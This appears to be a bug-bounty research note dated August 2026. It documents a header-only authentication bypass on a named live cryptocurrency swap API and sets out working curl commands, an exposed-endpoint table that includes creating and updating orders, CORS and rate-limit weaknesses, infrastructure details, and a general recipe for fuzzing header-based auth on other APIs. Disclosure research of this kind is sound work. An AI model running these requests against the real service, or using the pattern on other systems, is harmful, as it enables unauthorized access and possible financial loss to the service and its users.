# XO Swap API — Header-Only Auth Bypass Pattern (Aug 2026)

## Target
- `api.xoswap.com` (Exodus wallet's cross-chain swap API)
- Bounty programs: HackerOne + Bugcrowd (both active)

## Technique: Header-Only Auth Bypass

The API uses `App-Name`, `App-Version`, `App-Platform` HTTP headers as sole authentication.
The server only checks if `App-Name` header EXISTS — does NOT validate the value.

```bash
# Without header → 401
curl -s "https://api.xoswap.com/v3/pairs"
# → {"status":401,"code":"UNAUTHORIZED","details":"missing authentication"}

# ANY App-Name value → 200 (full API access)
curl -s "https://api.xoswap.com/v3/pairs" -H "App-Name: literally-anything"
# → [{...74,299 pairs...}]

# Even hostile names work:
curl -s "https://api.xoswap.com/v3/pairs?limit=1" -H "App-Name: admin"      # ✅
curl -s "https://api.xoswap.com/v3/pairs?limit=1" -H "App-Name: test"       # ✅
curl -s "https://api.xoswap.com/v3/pairs?limit=1" -H "App-Name: hacker"     # ✅
```

## Combined Impact Chain
1. **swagger.json publicly exposed** → full API surface map
2. **Header auth bypass** → unrestricted access to all endpoints
3. **CORS wildcard** (`Access-Control-Allow-Origin: *`) → browser-based exploitation
4. **No rate limiting** → 10+ sequential requests all 200
5. **Dev server exposed** in swagger (`exchange-s.exodus.io/v3`)
6. **Geolocation endpoint** leaks IP + country without auth

## Swagger Discovery
```bash
curl -s "https://api.xoswap.com/swagger.json" | python3 -m json.tool | head -20
# Returns full OpenAPI 3.0.3 spec with:
# - All endpoints + schemas
# - Production server: exchange.exodus.io/v3
# - Development server: exchange-s.exodus.io/v3
# - Security schemes: App-Name (header), App-Version (header), App-Platform (header)
```

## Key Endpoints Accessible
| Endpoint | Method | Auth Required | Notes |
|----------|--------|---------------|-------|
| /v3/assets | GET | None (!) | 100+ trading assets |
| /v3/pairs | GET | App-Name (any) | 74,299 pairs |
| /v3/pairs/{id}/rates | GET | App-Name (any) | Live exchange rates |
| /v3/pairs/{id}/quotes | GET | App-Name (any) | Price quotes |
| /v3/orders | POST | App-Name (any) | CREATE swap orders |
| /v3/orders/{id} | GET | App-Name (any) | Read order details |
| /v3/orders/{id} | PATCH | App-Name (any) | UPDATE orders |
| /v3/geolocation | GET | None | IP + country leak |
| /v3/rates/best | GET | App-Name (any) | Best rates across providers |
| /status | GET | None | Returns 🚀 (health check) |

## CORS Headers (Full Permissive)
```
access-control-allow-origin: *
access-control-allow-methods: GET, PUT, POST, DELETE, PATCH, OPTIONS
access-control-allow-headers: DNT,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range,Authorization
access-control-max-age: 1728000
```

## General Pattern: API Header Auth Bypass Detection
When you see API returning 401 "missing authentication":
1. Check swagger/openapi spec first → reveals auth mechanism
2. If auth is header-based (not OAuth/JWT/session), fuzz the header VALUE
3. Common patterns that bypass:
   - Header present but empty: `App-Name: ` → sometimes works
   - Header with any string: `App-Name: x` → works if existence-only check
   - Header with known app name: `App-Name: exodus` → most common
4. Test with different values to confirm NO validation (not just weak validation)

## Infrastructure Notes
- All behind Cloudflare
- `exchange.exodus.io` has stricter CF bot protection (403)
- `api.xoswap.com` is the more permissive endpoint (same backend, different CF rules)
- Login/keys subdomains behind CF managed challenge (Turnstile)
- Internal tools (*.ot.exodus.com) behind Cloudflare Access

## Severity Assessment
- CWE-287 (Improper Authentication): HIGH/CRITICAL
- Combined with CORS wildcard + no rate limit: escalates to CRITICAL
- Order creation without user consent = potential financial impact
